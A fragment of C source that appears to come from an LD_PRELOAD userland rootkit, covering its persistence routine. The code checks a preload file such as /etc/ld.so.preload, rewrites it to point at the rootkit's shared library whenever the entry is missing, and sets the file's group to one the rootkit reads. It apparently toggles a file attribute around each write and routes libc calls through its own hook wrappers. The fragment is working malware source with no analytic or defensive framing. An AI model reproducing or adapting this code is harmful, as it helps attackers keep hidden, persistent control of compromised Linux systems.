int _preloadok(const char *preloadpath, char *installdir, char *bdvlso){ // returns 1 if preloadpath is ok.
    struct stat preloadstat;
    int status = 1,
        statret;
    char *sopath;

    hook(C__XSTAT);
    memset(&preloadstat, 0, sizeof(stat));
    statret = (long)call(C__XSTAT, _STAT_VER, preloadpath, &preloadstat);

    sopath = rksopath(installdir, bdvlso);
    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(sopath))
        status = 0;
    free(sopath);

    if(status != 0){
        doiapath(preloadpath, 0);
        chown_path(preloadpath, readgid());
        doiapath(preloadpath, 1);
    }
    return status;
}

int preloadok(const char *preloadpath, char *installdir, char *bdvlso){
    return _preloadok(preloadpath, installdir, bdvlso);
}

void reinstall(const char *preloadpath, char *installdir, char *bdvlso){
    if(preloadok(preloadpath, installdir, bdvlso))
        return;

    char *sopath = rksopath(installdir, bdvlso);
    if(!sopath) return;

    doiapath(preloadpath, 0);

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, preloadpath, "w");

    if(ldfp != NULL){
        call(CFWRITE, sopath, 1, strlen(sopath), ldfp);
        fflush(ldfp);
        fclose(ldfp);
        chown_path(preloadpath, readgid());
    }
    free(sopath);
    doiapath(preloadpath, 1);
}
